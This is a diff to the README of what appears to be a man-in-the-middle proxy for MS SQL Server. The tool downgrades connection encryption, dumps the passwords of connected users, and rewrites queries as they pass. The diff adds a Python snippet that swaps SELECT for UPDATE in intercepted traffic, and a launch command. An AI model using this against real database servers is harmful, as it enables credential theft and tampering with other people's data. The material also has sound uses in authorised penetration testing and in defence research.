@@ -9,7 +9,7 @@ When possible it downgrades connection to non-encrypted on both sides, if not it
 In the future also server emulation option is planned - no SQL server will be needed to obtain credentials from the client.
 
 ## Dumping passwords
-It shows passwords of connected users as well as those created during the connection.
+It shows passwords of connected users as well as those created or altered (changed) during the connection.
 
 ![screen](https://github.com/defragmentator/mitmsqlproxy/blob/master/screen.png?raw=true)
 
@@ -24,6 +24,18 @@ tcpdump -i lo port 1434 -X
 Traffic can be also easy redirected to some other middle application to manipulate queries. It needs to listen on some port, manipulate the data and send it back to some other port. All processed data is already decrypted.
 
 As example *manipulation_example.py3* show how to change all SELECT queries to UPDATE on-the-fly:
+
+```python
+...
+    def dataReceived(self, data):
+        i = data.find("SELECT".encode('utf-16le'))
+        if i > -1:
+            print("FOUND: SELECT - replacing to UPDATE")
+            rstr = "UPDATE".encode('utf-16le')
+            data = data[:i] + rstr + data[i + len(rstr):]
+...
+```
+
 ```
 ./mitmsqlproxy.py 192.168.123.2 -d -lcp 1444 &
 
